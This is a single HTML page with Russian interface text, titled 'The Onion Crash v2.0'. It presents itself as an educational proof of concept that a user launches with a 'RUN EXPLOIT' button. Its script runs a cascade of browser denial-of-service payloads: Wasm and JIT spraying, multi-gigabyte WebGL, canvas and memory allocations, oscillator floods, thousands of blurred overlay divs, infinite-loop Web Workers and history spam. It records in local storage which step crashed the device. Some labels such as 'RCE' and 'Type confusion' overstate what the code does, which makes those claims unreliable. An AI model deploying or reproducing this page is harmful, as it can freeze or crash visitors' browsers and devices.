<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>The Onion Crash v2.0</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
        
        :root {
            --neon-pink: #ff00ff;
            --neon-cyan: #00ffff;
        }
        
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: #0a001f;
            color: #00ffcc;
            font-family: 'Press Start 2P', system-ui;
            overflow: hidden;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }
        .grid-bg {
            position: absolute;
            inset: 0;
            background: linear-gradient(rgba(0,255,200,0.03) 1px, transparent 1px),
                        linear-gradient(90deg, rgba(0,255,200,0.03) 1px, transparent 1px);
            background-size: 50px 50px;
            animation: gridMove 25s linear infinite;
            z-index: 0;
        }
        @keyframes gridMove { 0% {background-position:0 0} 100% {background-position:-150px -150px} }
        
        .container {
            position: relative;
            z-index: 1;
            width: 94%;
            max-width: 640px;
            background: rgba(15,5,45,0.95);
            border: 4px solid var(--neon-pink);
            box-shadow: 0 0 40px var(--neon-pink), inset 0 0 30px rgba(0,255,255,0.2);
            border-radius: 12px;
            padding: 30px 20px;
            text-align: center;
        }
        
        h1 {
            font-size: 2.4em;
            color: var(--neon-pink);
            text-shadow: 0 0 20px var(--neon-pink);
            animation: flicker 1.2s infinite alternate;
        }
        @keyframes flicker { 0%{opacity:0.85} 100%{opacity:1} }
        
        .subtitle { color:#ff00aa; margin:10px 0 25px; font-size:1.1em; }
        
        .warning {
            background:rgba(180,0,0,0.25);
            border:2px solid #ff4444;
            color:#ffaaaa;
            padding:18px;
            margin:20px 0;
            border-radius:8px;
            font-size:0.85em;
        }
        
        button {
            font-family: 'Press Start 2P', system-ui;
            padding: 18px 45px;
            font-size: 1.15em;
            background: transparent;
            color: var(--neon-cyan);
            border: 4px solid var(--neon-cyan);
            cursor: pointer;
            box-shadow: 0 0 30px var(--neon-cyan);
            transition: all .3s;
            text-transform: uppercase;
        }
        button:hover { background:var(--neon-cyan); color:#000; transform:scale(1.08); }
        button:disabled { opacity:0.35; cursor:not-allowed; }
        
        #progress { margin:25px 0; min-height:32px; font-size:0.95em; color:#00ff99; }
        #status {
            background:#00000099;
            border:1px solid #00ffcc;
            padding:14px;
            height:140px;
            overflow-y:auto;
            text-align:left;
            font-size:0.82em;
            border-radius:4px;
        }
        
        .history { margin-top:30px; text-align:left; }
        .history h3 { color:var(--neon-pink); margin-bottom:12px; }
        .session {
            background:rgba(0,0,0,0.5);
            padding:10px;
            margin-bottom:8px;
            border-left:5px solid #00ff88;
            font-size:0.8em;
        }
        .crashed { border-left-color:#ff4444; }
    </style>
</head>
<body>
    <div class="grid-bg"></div>
    
    <div class="container">
        <h1>THE ONION CRASH</h1>
        <div class="subtitle">LAST HOPE v2.0</div>
        
        <div class="warning">
            <strong>⚠️ EDUCATIONAL PoC ONLY</strong><br>
            Только для собственных тестовых устройств.<br>
            Не используй на основном телефоне.
        </div>
        
        <button id="runBtn">▶ RUN EXPLOIT</button>
        
        <div id="confirm" style="display:none; margin-top:15px;">
            <p style="color:#ff6666; font-size:1.05em;">Устройство может перезагрузиться.<br>Продолжить?</p>
            <button id="confirmYes" style="margin:8px;">ДА, Я ПОНИМАЮ РИСК</button>
            <button onclick="document.getElementById('confirm').style.display='none'">ОТМЕНА</button>
        </div>
        
        <div id="progress">Готов к запуску...</div>
        <div id="status"></div>
        
        <div class="history">
            <h3>ИСТОРИЯ</h3>
            <div id="historyList"></div>
        </div>
    </div>

    <script>
        const LAYERS = [
            // LOW
            {g:"LOW", n:"RCE JIT + Wasm spray", p:"low", f:async()=>{for(let i=0;i<180;i++){try{new WebAssembly.Instance(new WebAssembly.Module(new Uint8Array([0,97,115,109,1,0,0,0])));}catch(e){}} try{new ArrayBuffer(1024*1024*950);}catch(e){}}},
            {g:"LOW", n:"Type confusion spray", p:"low", f:async()=>{const b=new ArrayBuffer(8*1024*1024); new Float64Array(b); new Uint32Array(b);}},
            {g:"LOW", n:"Sandbox probe", p:"low", f:async()=>{if(window.webkit?.messageHandlers) console.log("%cOUT OF SANDBOX?!", "color:red");}},
            {g:"LOW", n:"WebGL 2GB buffer", p:"low", f:async()=>{const c=document.createElement('canvas'); const gl=c.getContext('webgl2'); if(gl)try{const buf=gl.createBuffer();gl.bindBuffer(gl.ARRAY_BUFFER,buf);gl.bufferData(gl.ARRAY_BUFFER,2**31-1,gl.STATIC_DRAW);}catch(e){}}},
            {g:"LOW", n:"Wasm 4GB memory", p:"low", f:async()=>{try{new WebAssembly.Memory({initial:65536});}catch(e){}}},
            ...Array.from({length:6},(_,i)=>({g:"LOW", n:`JIT Storm ${i+1}`, p:"low", f:async()=>{for(let j=0;j<400;j++) new Function('x','return x+'+Math.random());}})),
            
            // MEDIUM
            {g:"MEDIUM", n:"AudioContext flood", p:"medium", f:async()=>{const a=new (window.AudioContext||window.webkitAudioContext)();for(let i=0;i<150;i++){const o=a.createOscillator();o.connect(a.destination);o.start();}}},
            {g:"MEDIUM", n:"Canvas 16k toDataURL", p:"medium", f:async()=>{const c=document.createElement('canvas');c.width=c.height=16384;const ctx=c.getContext('2d');ctx.fillRect(0,0,16384,16384);for(let i=0;i<3;i++)try{c.toDataURL()}catch(e){}}},
            {g:"MEDIUM", n:"IndexedDB spam", p:"medium", f:async()=>{}},
            {g:"MEDIUM", n:"CSS Blur Storm 400", p:"medium", f:async()=>{for(let i=0;i<400;i++){const d=document.createElement('div');Object.assign(d.style,{position:'fixed',width:'120px',height:'120px',left:Math.random()*innerWidth+'px',top:Math.random()*innerHeight+'px',backdropFilter:'blur(22px)',animation:'spin 400ms linear infinite'});document.body.appendChild(d);}}},
            {g:"MEDIUM", n:"Worker bomb 10", p:"medium", f:async()=>{for(let i=0;i<10;i++)try{new Worker(URL.createObjectURL(new Blob(['while(1){}'])));}catch(e){}}},
            {g:"MEDIUM", n:"History spam", p:"medium", f:async()=>{for(let i=0;i<1500;i++)history.pushState(null,null,'#'+i);}},
            
            // HIGH
            {g:"HIGH", n:"Backdrop DOOMSDAY 2500", p:"high", f:async()=>{for(let i=0;i<2500;i++){const d=document.createElement('div');d.style.cssText=`position:fixed;inset:0;backdrop-filter:blur(${140+Math.random()*60}px);opacity:0.25;transform:rotate(${Math.random()*360}deg)`;document.body.appendChild(d);}}},
            {g:"HIGH", n:"Giant 32k Canvas", p:"high", f:async()=>{const c=document.createElement('canvas');c.width=32768;c.height=32768;try{c.getContext('2d');}catch(e){}}},
            {g:"HIGH", n:"Nuclear Combo", p:"high", f:async()=>{document.getElementById('status').innerHTML += '<br><span style="color:#ff00ff">FINAL NUKE...</span>';}}
        ];

        let session = null;
        let running = false;

        function save() { localStorage.setItem('onionCurrent', JSON.stringify(session)); }
        
        function detectPreviousCrash() {
            const prev = JSON.parse(localStorage.getItem('onionCurrent') || 'null');
            if (!prev || prev.status !== 'running') return;
            
            const crashedIdx = prev.layers.findIndex(l => l.status === 'running');
            if (crashedIdx > -1) prev.layers[crashedIdx].status = 'crashed';
            prev.status = 'crashed';
            
            let hist = JSON.parse(localStorage.getItem('onionHistory') || '[]');
            hist.unshift(prev);
            localStorage.setItem('onionHistory', JSON.stringify(hist.slice(0,8)));
            localStorage.removeItem('onionCurrent');
            
            document.getElementById('status').innerHTML = `<span style="color:#ff4444">CRASH DETECTED at: ${prev.layers[crashedIdx]?.n || 'unknown'}</span>`;
        }
        
        function loadHistory() {
            const hist = JSON.parse(localStorage.getItem('onionHistory') || '[]');
            const el = document.getElementById('historyList');
            el.innerHTML = '';
            hist.forEach(s => {
                const d = document.createElement('div');
                d.className = `session ${s.status==='crashed'?'crashed':''}`;
                d.innerHTML = `${s.start.slice(0,19)} — <b>${s.status}</b><br>Layer: ${s.layers.find(l=>l.status==='crashed')?.n || '—'}`;
                el.appendChild(d);
            });
        }

        async function runLayer(layer, idx) {
            const prog = document.getElementById('progress');
            const stat = document.getElementById('status');
            
            session.layers[idx].status = 'running';
            save();
            
            prog.textContent = `[${idx+1}/${LAYERS.length}] ${layer.g} | ${layer.n}`;
            stat.innerHTML += `<br>→ ${layer.n} ...`;
            
            try {
                await layer.f();
                await new Promise(r=>setTimeout(r,25));
                session.layers[idx].status = 'completed';
                stat.innerHTML += ` <span style="color:#00ff88">OK</span>`;
            } catch(e) {
                session.layers[idx].status = 'error';
                stat.innerHTML += ` <span style="color:#ffaa00">ERR</span>`;
            }
            save();
        }

        async function start() {
            if (running) return;
            running = true;
            document.getElementById('runBtn').disabled = true;
            
            session = {
                id: Date.now(),
                start: new Date().toISOString(),
                status: 'running',
                layers: LAYERS.map(l=>({n:l.n, status:'pending'}))
            };
            save();
            
            document.getElementById('status').innerHTML = 'Cascade started...';
            
            for (let i = 0; i < LAYERS.length; i++) {
                if (!running) break;
                await runLayer(LAYERS[i], i);
            }
            
            session.status = 'completed';
            save();
            document.getElementById('status').innerHTML += '<br><span style="color:#00ffcc">FINISHED WITHOUT CRASH</span>';
            running = false;
            document.getElementById('runBtn').disabled = false;
        }

        // INIT
        window.onload = () => {
            detectPreviousCrash();
            loadHistory();
            
            document.getElementById('runBtn').onclick = () => document.getElementById('confirm').style.display = 'block';
            document.getElementById('confirmYes').onclick = () => {
                document.getElementById('confirm').style.display = 'none';
                start();
            };
        };
    </script>
</body>
</html>
